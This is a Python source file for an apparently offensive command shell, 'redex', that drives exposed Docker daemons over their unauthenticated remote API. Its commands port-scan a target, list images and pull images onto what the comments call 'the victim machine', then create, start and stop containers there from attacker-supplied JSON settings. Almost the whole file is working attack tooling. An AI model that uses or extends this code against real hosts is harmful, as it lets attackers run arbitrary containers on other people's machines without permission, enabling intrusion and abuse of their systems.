import json
import requests
import socket
import rich

from dataclasses import dataclass
from typing import Callable, Optional
from redex.network.portscan import PortScanner


@dataclass
class Command(object):
    """**Command Data Class**

    Define a single command.

    Attributes
    ----------
    name : str
        The name of the command
    desc : str
        A general description of the command
    cmd : str
        The actual usage information
    """
    name : str
    cmd  : str
    desc : str
    func : Optional[Callable] = None

    def __str__(self) -> str:
        s = \
          f"{self.name} - Usage: {self.cmd}\n" + \
          f"    {self.desc}\n"

        return s
    
    def __call__(self, redex_cls, *args, **kwargs) -> None:
        self.func(redex_cls, *args, **kwargs)

## ------------------------- HELP COMMAND ------------------------
def help_cmd(redex_cls, *args, **kwargs) -> None:
    commands = redex_cls.commands.__dict__
    filters = list(map(lambda x: x.lower(), commands.keys())) \
        if len(args) == 0 \
        else list(args[0].split())
    
    c = rich.console.Console(color_system="truecolor")
    for cmd_name, cmd_object in commands.items():
        if cmd_name.lower() not in filters: continue
        if not isinstance(cmd_object, Command): continue
        c.print(cmd_object.__str__())


C_HELP = Command("help", "help", "Show all a description of all commands", func=help_cmd)
help_cmd.__doc__ = C_HELP.desc


## ------------------------- CLEAR COMMAND ------------------------
def clear_cmd(redex_cls, *args, **kwargs) -> None:
    redex_cls.console.clear()


C_CLEAR = Command("clear", "clear", "Clear the Command-Line", func=clear_cmd)
clear_cmd.__doc__ = C_CLEAR.desc


## ------------------------- QUIT COMMAND ------------------------
def quit_cmd(redex_cls, *args, **kwargs) -> None:
    redex_cls.console.print("\n[*] Quitting ... ", style="bold red")
    import sys; sys.exit(0)


C_QUIT = Command("quit", "quit", "Quit the application", func=quit_cmd)
quit_cmd.__doc__ = C_QUIT.desc

## ------------------------- SET COMMAND ------------------------
def set_cmd(redex_cls, *args, **kwargs) -> None:
    sets = [tuple(v.split("=")) for v in args]

    # Set the values
    for variable, value in sets:
        attr = f"s_{variable.lower()}"
        # Convert to a number if condition hold
        if value.isnumeric(): value = int(value)
        if variable == "EXPLOIT": continue
        setattr(redex_cls.session, attr, value)
        redex_cls.console.print(f"[*] Setting {variable} => {value}")


C_SET = Command(
    "set", "set VAR=VALUE", 
    "Set the value of a session variable. To see all possible variables type 'show'",
    func=set_cmd
)
set_cmd.__doc__ = C_SET.desc

## ------------------------- SETDATA COMMAND ------------------------
def setdata_cmd(redex_cls, *args, **kwargs) -> None:
    sets = [tuple(v.split("=")) for v in args]

    for var, filename in sets:
        data = json.load(open(filename, mode="r"))
        attr = f"c_{var.lower()}"
        setattr(redex_cls.container_data, attr, data)


C_SETDATA = Command(
    "setdata", "setdata VAR=JSONFILE", 
    "Set the value of a container data variable with the content of a JSON file",
    func=setdata_cmd
)
setdata_cmd.__doc__ = C_SETDATA.desc

## ------------------------- SHOW COMMAND ------------------------
def show_cmd(redex_cls, *args, **kwargs) -> None:
    filters = list(redex_cls.session.__dict__.keys())
    if len(args) > 0: filters = list(map(lambda x: "s_" + x.lower(), args[0].split()))
    for attr, value in redex_cls.session.__dict__.items():
        # Check if the attribute starts in the way we set the 
        # new variables, using the SET command, in the class.
        if not attr.startswith("s_"): continue
        if not attr.lower() in filters: continue
        attr = attr.split("_")[-1].upper()
        if isinstance(value, dict):
            redex_cls.console.print("%s =" % attr)
            redex_cls.console.print(value)
            continue

        redex_cls.console.print(f"{attr} = {value} (type={type(value)})")


C_SHOW = Command(
    "show", "show [VAR1 ...]",
    "Show the value of a variable. All if no variable is given",
    func=show_cmd
)
show_cmd.__doc__ = C_SHOW.desc


## ------------------------- SHOW COMMAND ------------------------
def showdata_cmd(redex_cls, *args, **kwargs) -> None:
    filters = list(redex_cls.container_data.__dict__.keys())
    if len(args) > 0: filters = list(map(lambda x: "c_" + x.lower(), args[0].split()))
    for attr, value in redex_cls.container_data.__dict__.items():
        # Check if the attribute starts in the way we set the 
        # new variables, using the SETDATA command, in the class.
        if not attr.startswith("c_"): continue
        if not attr.lower() in filters: continue
        attr = attr.split("_")[-1].upper()
        redex_cls.console.print("%s =" % attr)
        redex_cls.console.print(value)


C_SHOWDATA = Command(
    "showdata", "showdata [VAR ...]", 
    "Shows the content of variable 'VAR' contained in the container data.\n" + \
    "    If not name is provided, then all variables will be listed.", 
    func=showdata_cmd
)
showdata_cmd.__doc__ = C_SHOWDATA.desc


## ------------------------- SCAN COMMAND ------------------------
def scan_cmd(redex_cls, *args, **kwargs) -> None:
    remote_host = redex_cls.session.s_rhost if len(args) == 0 else args[0]
    port_scanner = PortScanner(redex_cls.console)
    port_scanner.run(remote_host)


C_SCAN = Command(
    "scan", "scan [IP]", 
    "Scan a specified IP looking for open ports. If no input is provided\n" + \
    "    it will scan the IP provided in the session varible 'RHOST'.", 
    func=scan_cmd
)
scan_cmd.__doc__ = C_SCAN.desc

## ------------------------- LSTIMGS COMMAND ------------------------
def lstimgs_cmd(redex_cls, *args, **kwargs) -> None:
    # Send a GET request to the remote Docker Daemon, in order
    # to obtain all the images actually downloaded on the victim machine.
    response = requests.get(f"http://{redex_cls.session.s_rhost}:{redex_cls.session.s_rport}/images/json")
    filter_dictionary = dict()

    # Check if the user has also given some filters regardin
    # the expected Tag and name of images. This is the case
    # in which the user may want to check if the victim machine
    # has downloaded a particular version of an image
    if len(args):
        filters = args[0].split("=")[-1].split(",")
        filters = [(f"{f}:latest" if ":" not in f else ":".join(f.split(":"))) for f in filters]
        filter_dictionary = {f: False for f in filters}
    else:
        filters = []

    # Fill the data with all the images found in the victim machine
    # obtained as response from the previous request made to the daemon
    for data in response.json():
        for filter in filters:
            if filter in data["RepoTags"]:
                filter_dictionary[filter] = True
                break

        if len(filters) == 0:
            filter_dictionary[data["RepoTags"][0]] = True
    
    redex_cls.console.print(filter_dictionary)


C_LSTIMGS = Command(
    "lstimgs", "lstimgs [filters=[VAL1[:TAG],...]]",
    "List all images of a remote host, or those that match the filters", 
    func=lstimgs_cmd
)
lstimgs_cmd.__doc__ = C_LSTIMGS.desc


## ------------------------- PULL COMMAND ------------------------
def socket_connect(sock: socket.socket, rhost: str, rport: int) -> bool:
    """
    Try to connect to a remote host via a socket

    Parameters
    ----------
    sock : socket.socket
        The socket used to test the connection towards a remote host
    rhost : str
        The IP address of the remote host you would like to connect
    rport : int
        The port number through which the connection should be made

    Returns
    -------
    bool
        True if the connection is successfull, False otherwise.
    """
    try:
        sock.connect((rhost, rport))
        return True
    except socket.gaierror:
        return False
    

def pull_cmd(redex_cls, *args, **kwargs) -> None:
    # Define the name of the image that the user would like to
    # pull on the victim machine. In particular if the tag
    # has not been provided, the default "latest" is used.
    if len(args) > 0:
        image = args[0]
        image = f"{image}:latest" if ":" not in image else image
    else:
        image = redex_cls.session.s_image

    # Create the HTTP request to sent to the Docker Daemon
    request = f"POST /images/create?fromImage={image} HTTP/1.1\r\n" + \
              f"Host:{redex_cls.session.s_rhost}:{redex_cls.session.s_rport}\r\n\r\n"    + \
               "Content-Type: application/json\r\n"
    
    encoded_req = request.encode()

    # Setting up the socket that will be used to sent the request
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connected = socket_connect(sock, redex_cls.session.s_rhost, redex_cls.session.s_rport)
    if not connected: return 

    # Let's send the encoded request and wait until the
    # entire image has been downloaded into the victim host
    try:
        sock.send(encoded_req)

        # Receives the first 4096 bytes of results. They are enough
        # for what we need to check if the image has been downloaded
        response = sock.recvmsg(4096)
        progress = json.loads(response[0].decode().split("\r\n")[10])

        # Let's loop until we finished
        while "Downloaded" not in progress["status"]:
            response = sock.recvmsg(4096)
            progress = json.loads(response[0].decode().split("\r\n")[1])

            if "progress" in progress:
                redex_cls.console.print(
                    f"[*] Pulling: [magenta]{progress['progress']}[/magenta]",
                    end="\r"
                )

        print("\n")
    except BrokenPipeError:
        redex_cls.console.print("[*] Command failed!", style="bold red")

    sock.close()


C_PULL = Command(
    "pull", "pull [IMAGE[:TAG]]",
    "Pull a given image on the remote host. If no input image is provided\n" + \
    "    it will pull the one provided by the value of the session variable 'IMAGE'.",
    func=pull_cmd
)
pull_cmd.__doc__ = C_PULL.desc


## ------------------------- CREATE COMMAND ------------------------
def create_cmd(redex_cls, *args, **kwargs) -> None:
    container_name = redex_cls.session.s_name
    container_data = redex_cls.container_data

    # First let's check that the user has provided two inputs
    # In this case the first is the name of the container, while
    # the last is the data that will be used to create the container
    if len(args) == 2:
        container_name = args[0]
        container_data_name = args[1].split('=')[-1]
        container_data = getattr(redex_cls.container_data, f"c_{container_data_name}")
    
    if len(args) == 1:
        input_arg = args[0]
        # In this case we need to check whether the input argument
        # is the name of the container or its data.
        if "=" in input_arg: # it is the container data
            container_data_name = input_arg.split('=')[-1]
            container_data = getattr(redex_cls.container_data, f"c_{container_data_name}")
        else: # Is the name of the container
            container_name = input_arg

    if container_name not in redex_cls.session.s_names:
        redex_cls.session.s_names.append(container_name)

    addr  = f"{redex_cls.session.s_rhost}:{redex_cls.session.s_rport}"
    query = f"name={container_name}"
    
    # Let's create a POST request to create a specified container
    # The data that the request should contain is in the DATA variable
    response = requests.post(
        f"http://{addr}/containers/create?{query}", json=container_data['create']
    )

    # Check if the response code is 201
    if response.status_code != 201:
        redex_cls.console.print(
            f"[*] [red]Error: {response.json()['message']}[/red]"
        )
        raise Exception
    
    redex_cls.console.print(
        f"[*] [green]Container Created[/green] ID: {response.json()['Id']}"
    )


C_CREATE_DOC = """Create a container in a remote host. The DATA argument selects the corresponding
    container data variable that contains the settings of the new container. If
    no data is provided, it will use the one of the DEFAULT variable. Type
    'showdata DEFAULT' to see the content of this variable. Also, you can type
    'showdata' to see the content of all container data variables. The name of
    the new container will be setted either to the value of the NAME argument,
    if provided, or to the value of the 'NAME' session variable. If a different
    name is provided then it will be added to the set of all names. To show the
    content of the 'NAME' variable type 'show name', otherwise to see all names
    type 'shownames'.
"""
C_CREATE = Command("create", "create [NAME] [DATA=DATA]", C_CREATE_DOC, func=create_cmd)
create_cmd.__doc__ = "\n".join([x.strip() for x in C_CREATE.desc.split("\n")])


## ------------------------- START COMMAND ------------------------
def start_cmd(redex_cls, *args, **kwagrs) -> None:
    addr  = f"{redex_cls.session.s_rhost}:{redex_cls.session.s_rport}"
    container_name = redex_cls.session.s_name if len(args) == 0 else args[0]
    if not container_name in redex_cls.session.s_names:
        redex_cls.console.print(
            f"[*] Error. Container: {container_name} does not exists", style="bold red"
        )
        return
    
    response = requests.post(f"http://{addr}/containers/{container_name}/start")
    if response.status_code != 204:
        redex_cls.console.print(f"[*] [red]Error: {response.json()['message']}[/red]")
        raise Exception
    
    redex_cls.console.print(
        f"[*] [green]Container {container_name.upper()} Has stated[/green]"
    )


C_START = Command(
    "start", "start [NAME]", 
    "Start a container with name 'NAME'. If no input name is given\n"   + \
    "    it will start the one with the default name of the session.\n" + \
    "    It is possible to see the name with 'show name'.", 
    func=start_cmd
)
start_cmd.__doc__ = C_START.desc


## ------------------------- STOP COMMAND ------------------------
def stop_cmd(redex_cls, *args, **kwargs) -> None:
    addr  = f"{redex_cls.session.s_rhost}:{redex_cls.session.s_rport}"
    container_name = redex_cls.session.s_name if len(args) == 0 else args[0]
    if not container_name in redex_cls.session.s_names:
        redex_cls.console.print(
            f"[*] Error. Container: {container_name} does not exists", style="bold red"
        )
        return
    
    response = requests.post(f"http://{addr}/containers/{container_name}/stop")
    if response.status_code != 204:
        redex_cls.console.print(f"[*] [red]Error: {response.json()['message']}[/red]")
        raise Exception
    
    redex_cls.console.print(
        f"[*] [green]Container {container_name.upper()} Has been stopped[/green]"
    )


C_STOP = Command(
    "stop", "stop [NAME]", 
    "Stop a running container named 'NAME'. If not input is provided\n"      + \
    "    It will stop the container named with the content of the session\n" + \
    "    'NAME' varible. To see its content, just type 'show name'.", 
    func=stop_cmd
)
stop_cmd.__doc__ = C_STOP.desc



@dataclass(frozen=True)
class RedexCommands(object):
    HELP     : Command = C_HELP
    CLEAR    : Command = C_CLEAR
    QUIT     : Command = C_QUIT
    SET      : Command = C_SET
    SETDATA  : Command = C_SETDATA
    SHOW     : Command = C_SHOW
    SHOWDATA : Command = C_SHOWDATA
    SCAN     : Command = C_SCAN
    LSTIMGS  : Command = C_LSTIMGS
    PULL     : Command = C_PULL
    CREATE   : Command = C_CREATE
    START    : Command = C_START
    STOP     : Command = C_STOP

    def __getitem__(self, key: str) -> Command:
        """ Returns the corresponding command """
        commands = { 
            k.lower() : v  for k, v in self.__dict__.items() 
            if isinstance(v, Command) 
        }

        if key.lower() not in commands.keys():
            raise KeyError(f"'{key}' is not a command")
        
        return commands[key]